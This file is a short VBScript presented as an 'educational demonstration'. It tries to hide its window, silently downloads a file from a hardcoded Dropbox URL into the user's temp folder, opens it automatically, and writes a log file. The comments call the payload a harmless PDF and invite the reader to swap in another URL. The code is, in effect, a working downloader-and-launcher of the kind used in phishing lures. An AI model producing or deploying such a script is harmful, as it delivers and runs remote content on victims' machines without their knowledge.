' Educational demonstration script
' This script will download a harmless PDF and open it

' Hide this script window
CreateObject("WScript.Shell").Run "cmd /c exit", 0, True

' Set up objects
Set http = CreateObject("MSXML2.ServerXMLHTTP")
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Location of your harmless PDF - replace with your actual PDF URL
pdfUrl = "https://www.dropbox.com/scl/fi/4fwezhh8oqxhmzvnyw683/doc.pdf?rlkey=aoo1hvcf7ducqinvyianbb0ay&st=ymlg530r&dl=1" 

' Create a path in the temp folder
tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\test-document.pdf"

' Download the PDF
On Error Resume Next
http.open "GET", pdfUrl, False
http.send

If http.Status = 200 Then
    ' Create binary stream for proper PDF handling
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile tempFile, 2 ' Overwrite if exists
    stream.Close
    
    ' Open the PDF file
    shell.Run """" & tempFile & """", 1, False
    
    ' Optional: Create a small log file showing this was executed
    ' for demonstration purposes
    logFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\demo_log.txt"
    Set logStream = fso.CreateTextFile(logFile, True)
    logStream.WriteLine "Demo executed at " & Now
    logStream.WriteLine "PDF downloaded to: " & tempFile
    logStream.Close
End If

' Clean up
Set http = Nothing
Set shell = Nothing
Set fso = Nothing

' Exit after short delay
WScript.Sleep 1000
WScript.Quit
